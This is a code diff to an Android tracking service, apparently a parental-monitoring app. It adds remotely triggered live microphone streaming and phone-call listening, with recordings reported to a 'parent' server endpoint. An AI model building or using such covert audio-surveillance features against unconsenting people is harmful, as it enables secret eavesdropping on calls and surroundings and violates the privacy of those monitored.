@@ -317,13 +317,19 @@ class TrackerService : Service() {
                     } catch (e: Exception) {}
                 }
             }
-            "record_audio" -> {
+            "record_audio", "listen_mic" -> {
                 val duration = params?.optInt("duration", 30) ?: 30
-                Log.d(TAG, "Starting ${duration}s continuous mic audio recording")
+                Log.d(TAG, "Starting live mic stream for ${duration}s (command $commandId)")
                 ApiClient.updateCommandStatus(commandId, "delivered")
 
-                scope.launch {
-                    recordMicAudioToFile(this@TrackerService, duration, commandId)
+                callStreamManager?.startStreaming(commandId)
+
+                if (duration > 0) {
+                    scope.launch {
+                        delay(duration * 1000L)
+                        callStreamManager?.stopStreaming()
+                        ApiClient.updateCommandStatus(commandId, "completed", "/api/parent/audio-recording/$commandId", "audio")
+                    }
                 }
             }
             "stop_audio" -> {
@@ -331,18 +337,17 @@ class TrackerService : Service() {
                 callStreamManager?.stopStreaming()
                 val targetCmdId = params?.optString("command_id")
                 if (!targetCmdId.isNullOrEmpty()) {
-                    ApiClient.updateCommandStatus(targetCmdId, "completed")
+                    ApiClient.updateCommandStatus(targetCmdId, "completed", "/api/parent/audio-recording/$targetCmdId", "audio")
                 }
                 ApiClient.updateCommandStatus(commandId, "completed")
             }
-
 
             "listen_call" -> {
                 val enable = params?.optBoolean("enable", true) ?: true
                 Log.d(TAG, "Listen call: enable=$enable")
                 if (enable) {
-                    callStreamManager?.startStreaming()
-                    ApiClient.updateCommandStatus(commandId, "completed")
+                    callStreamManager?.startStreaming(commandId)
+                    ApiClient.updateCommandStatus(commandId, "delivered")
                 } else {
                     callStreamManager?.stopStreaming()
                     ApiClient.updateCommandStatus(commandId, "completed")
